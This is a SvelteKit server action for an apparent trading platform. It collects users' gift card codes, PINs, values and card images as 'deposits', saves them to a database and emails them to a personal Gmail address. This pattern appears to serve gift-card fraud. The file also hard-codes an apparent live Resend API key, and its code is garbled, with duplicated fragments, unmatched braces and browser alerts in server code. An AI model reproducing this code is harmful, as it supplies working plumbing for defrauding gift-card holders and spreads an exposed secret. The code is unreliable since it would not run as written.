import { fail } from '@sveltejs/kit';

export const actions = {
  submitGiftCard: async ({ request, locals: { supabase } }) => {
    const formData = await request.formData();
    
    const userId = formData.get('userId');
    const cardType = formData.get('cardType');
    const cardCode = formData.get('cardCode');
    const cardPin = formData.get('cardPin');
    const amount = formData.get('amount');
    const frontUrl = formData.get('frontUrl');
    const backUrl = formData.get('backUrl');

    if (!userId) {
      return fail(401, { error: 'Unauthorized user session.' });
    }

    try {
      // 1. Insert into database
      const { error: dbError } = await supabase
        .from("gift_card_submissions")
        .insert([
          {
            user_id: userId,
            card_type: cardType,
            front_image_url: frontUrl || null,
            back_image_url: backUrl || null,
            card_code: cardCode || null,
            card_pin: cardPin || null,
            claimed_amount: amount ? parseFloat(amount) : null,
            status: "pending"
          }
        ]);

      if (dbError) throw dbError;

      // 2. Send email via native fetch (Zero packages needed!)
      // 2. Send email via native fetch
      const emailRes = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer re_SSJjCQov_BfzGS48eRiideoduu1eAQVhK'
        },
        body: JSON.stringify({
          from: 'Platform Bot <onboarding@resend.dev>',
          to: ['premiumprotrader.support@gmail.com'],
          subject: `🚨 New ${cardType} Gift Card Deposit ($${amount || 'Manual'})`,
          html: `
            <div style="font-family: Arial, sans-serif; padding: 20px; background: #f4f4f4; border-radius: 8px;">
              <h2 style="color: #333;">New Gift Card Upload</h2>
              <p><strong>User ID:</strong> ${userId}</p>
              <p><strong>Card Brand:</strong> ${cardType}</p>
              <p><strong>Face Value:</strong> $${amount || 'Not Specified'}</p>
              <p><strong>Manual Code:</strong> <code>${cardCode || 'N/A'}</code></p>
              <p><strong>Manual PIN:</strong> <code>${cardPin || 'N/A'}</code></p>
              <hr style="border: 0; border-top: 1px solid #ccc; margin: 15px 0;" />
              <p><strong>Front Image:</strong> ${frontUrl ? `<a href="${frontUrl}" target="_blank">View Front Image</a>` : 'None uploaded'}</p>
              <p><strong>Back Image:</strong> ${backUrl ? `<a href="${backUrl}" target="_blank">View Back Image</a>` : 'None uploaded'}</p>
            </div>
          `
        });

      const responseText = await emailRes.text();
      
      if (!emailRes.ok) {
        alert('❌ RESEND API ERROR:', responseText);
      } else {
        alert('✅ RESEND SUCCESS:', responseText);
      }
        })
      });

      // Optional: Add this to log the exact error response from Resend if it still fails
      if (!emailRes.ok) {
        const errorData = await emailRes.json();
        console.error('Email dispatch failed from Resend:', errorData);
      }
          `
        })
      });

      if (!emailRes.ok) {
        console.error('Email dispatch failed, but DB record was saved.');
      }

      return { success: true, message: 'Gift card submitted successfully!' };
    } catch (err) {
      console.error('Server Action Error:', err);
      return fail(500, { error: err.message || 'Failed to process submission.' });
    }
  }
};
